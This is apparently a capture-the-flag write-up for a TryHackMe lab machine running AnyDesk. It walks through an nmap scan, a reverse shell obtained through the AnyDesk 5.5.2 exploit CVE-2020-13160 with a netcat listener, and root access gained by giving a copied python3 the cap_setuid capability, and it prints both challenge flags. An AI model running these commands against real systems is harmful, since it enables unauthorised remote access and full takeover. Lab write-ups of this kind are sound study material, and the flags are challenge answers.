# IP
10.10.226.12

## Enumeration

### Nmap
Found 2 port running on the system 
```console
❯ nmap -sC -sV 10.10.226.12 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-21 11:52 IST
Nmap scan report for 10.10.226.12
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp open  ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2022-03-23T20:04:30
|_Not valid after:  2072-03-10T20:04:30
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 791.73 seconds
```

The service running on port `7070/tcp` is anyDesk, on googling found this service to be exploitable ([CVE:2020-13160](https://nvd.nist.gov/vuln/detail/CVE-2020-13160)) for linux systems. 


## Exploit
### Anydesk ([CVE:2020-13160](https://nvd.nist.gov/vuln/detail/CVE-2020-13160))
Found Remote Code execution for `Anydesk 5.5.2`, after making changes to the exploit and running this exploit got a reverse shell.
```console
❯ python2 49613.py
sending payload ...
reverse shell should connect within 5 seconds
```
```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.0.150] from (UNKNOWN) [10.10.226.12] 44538
python3 -c "import pty; pty.spawn('/bin/bash')"
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

annie@desktop:/home/annie$
```
Found `user.txt` 
```console
annie@desktop:/home/annie$ cat user.txt
THM{N0t_Ju5t_ANY_D3sk}
```
### Privilege Escalation 
Found `setcap` as `SUID` binary on looking for exploit found [this](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example).
```console
annie@desktop:/home/annie$ cp /usr/bin/python3 .
annie@desktop:/home/annie$ setcap cap_setuid+ep ./python3
annie@desktop:/home/annie$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash");'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@desktop:/home/annie# cat /root/root.txt
THM{0nly_th3m_5.5.2_D3sk}

```
